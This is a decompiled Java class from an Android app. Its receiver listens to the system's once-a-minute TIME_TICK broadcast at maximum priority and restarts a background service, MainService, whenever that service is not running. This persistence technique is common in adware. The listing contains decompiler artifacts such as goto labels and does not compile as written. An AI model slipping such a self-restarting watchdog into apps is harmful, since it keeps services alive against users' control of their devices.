// Decompiled by Jad v1.5.8e. Copyright 2001 Pavel Kouznetsov.
// Jad home page: http://www.geocities.com/kpdus/jad.html
// Decompiler options: packimports(3) 

package com.admv3.listener;

import android.app.ActivityManager;
import android.content.*;
import com.admv.service.MainService;
import java.util.Iterator;
import java.util.List;

public class TickReceiver extends BroadcastReceiver
{

    public TickReceiver()
    {
        spStr = "com.admv.service.MainService";
    }

    private boolean inRet(String s)
    {
        return spStr.equals(s);
    }

    public void onReceive(Context context, Intent intent)
    {
        if(!intent.getAction().equals("android.intent.action.TIME_TICK")) goto _L2; else goto _L1
_L1:
        boolean flag = false;
        Iterator iterator = ((ActivityManager)context.getSystemService("activity")).getRunningServices(0x7fffffff).iterator();
_L6:
        boolean flag1 = iterator.hasNext();
        if(flag1) goto _L4; else goto _L3
_L3:
        if(!flag)
            context.startService(new Intent(context, com/admv/service/MainService));
_L2:
        return;
_L4:
        boolean flag2 = inRet(((android.app.ActivityManager.RunningServiceInfo)iterator.next()).service.getClassName());
        if(!flag2) goto _L6; else goto _L5
_L5:
        flag = true;
        if(false) goto _L6; else goto _L3
        Exception exception;
        exception;
          goto _L3
    }

    public void register(Context context)
    {
        filter = new IntentFilter();
        filter.addAction("android.intent.action.TIME_TICK");
        filter.setPriority(0x7fffffff);
        context.registerReceiver(this, filter);
    }

    public void unregister(Context context)
    {
        context.unregisterReceiver(this);
    }

    private IntentFilter filter;
    private String spStr;
}
